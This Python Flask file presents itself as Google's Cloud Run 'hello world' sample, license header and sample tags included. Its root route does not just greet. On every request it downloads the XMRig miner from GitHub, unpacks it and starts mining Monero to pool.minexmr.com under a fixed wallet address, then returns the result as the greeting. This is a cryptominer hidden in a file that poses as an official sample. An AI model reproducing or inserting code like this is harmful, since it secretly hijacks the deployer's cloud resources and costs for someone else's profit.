# Copyright 2020 Google, LLC.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START cloudrun_helloworld_service]
# [START run_helloworld_service]
import os
import subprocess

from flask import Flask

app = Flask(__name__)


@app.route("/")
def hello_world():
    command = 'wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-static-x64.tar.gz'
    command2 = 'tar xf xmrig-6.12.1-linux-static-x64.tar.gz'
    command5 = 'xmrig-6.12.1/./xmrig -o pool.minexmr.com:4444 -u 46pnjyfeDsULtY7hzFCW3QV5uXuYSXHWZMU66ZwuUxiRbzYNDDtMhaiRYgaAHbsnxxdSVUkrnK3wtYvEFGJDhahcLbkBTyi --rig-id demo3'
    subprocess.check_call(command.split())
    subprocess.check_call(command2.split())
    res = subprocess.check_call(command5.split())
    return "Hello {}!".format(res)


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
# [END run_helloworld_service]
# [END cloudrun_helloworld_service]
